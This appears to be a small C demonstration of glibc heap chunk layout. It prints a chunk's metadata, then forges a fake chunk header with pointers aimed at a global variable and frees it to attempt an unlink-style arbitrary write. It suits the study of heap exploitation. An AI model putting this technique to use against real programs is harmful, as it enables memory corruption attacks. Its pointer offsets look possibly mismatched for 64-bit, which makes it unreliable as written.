#include<stdio.h>
#include<stddef.h>
#include<stdlib.h>
#include<stdint.h>
#include<string.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
#define SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA) // 0x07

int n = 0xABABAB;
int main(){
    void* p = malloc(128);
    uint64_t *lp = (uint64_t*) p;
    uint8_t size_it = sizeof(size_t);
    printf("__sizeof_size_t=%d\n", size_it);
    printf("__heap_prev_sz=0x%lx\n", *(lp - 2));
    printf("__heap_size=0x%lx\n", *(lp - 1));
    printf("__heap_data_size=%li\n", (*(lp - 1) & ~SIZE_BITS) - 2*size_it);

    uint64_t fake[] =  {0, 32, 0, 0, 32, 32 & PREV_INUSE, 
        (uint64_t)&n - 12, (uint64_t)&n + 10, 32, 32, 0, 0};
    // * (A+12) = B
    memcpy(lp - 2, fake, sizeof(fake));
    free(p);
    printf("n=%x\n", n);
}
